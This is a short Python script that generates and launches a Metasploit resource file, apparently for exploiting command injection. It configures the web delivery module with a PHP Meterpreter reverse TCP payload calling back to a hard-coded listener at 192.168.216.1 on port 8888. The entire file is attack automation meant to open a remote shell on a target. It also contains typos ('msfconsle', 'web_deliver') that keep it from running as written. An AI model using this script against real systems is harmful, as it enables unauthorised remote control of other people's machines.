import os

def Handler(configFile, lhost, lport):
    configFile.write('use exploit/multi/script/web_deliver'+'\n')
    configFile.write('set Target 1'+'\n')
    configFile.write('set payload php/meterpreter/reverse_tcp'+'\n')
    configFile.write('set LHOST '+str(lhost)+'\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('run'+'\n')

def main():
    configFile = open('Command_inject.rc', 'w')
    lhost = '192.168.216.1'
    lport = 8888
    Handler(configFile, lhost, lport)
    configFile.close()
    os.system('msfconsle -r Command_inject.rc')

main()